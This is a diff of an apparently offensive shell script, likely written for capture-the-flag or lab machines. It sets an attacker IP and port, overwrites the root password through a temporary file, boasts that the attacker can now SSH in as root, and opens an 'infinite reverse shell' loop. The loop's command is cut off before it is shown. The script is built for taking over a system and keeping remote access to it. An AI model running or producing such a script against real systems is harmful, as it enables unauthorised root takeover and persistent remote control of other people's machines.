@@ -9,10 +9,17 @@ PASS=seriously?   #change this
 IP=10.10.10.10    #change this (tun0)
 PORT=4444       #change this
 
-
+#Changing root password
+touch tmp
+echo $PASS > tmp
+echo $PASS >> tmp
 echo "[*]Changing password of root"
-echo $PASS | passwd $NEW      #changes the root password
+cat tmp | passwd                                         #changes the root password
+rm tmp
 echo "[+] Passowrd changed! LMAO"
+echo "The root password has been changed! You can directly ssh into root now!"
+
+sleep 3
 
 # Infinite Reverse shell
 while [ 1 ]; do
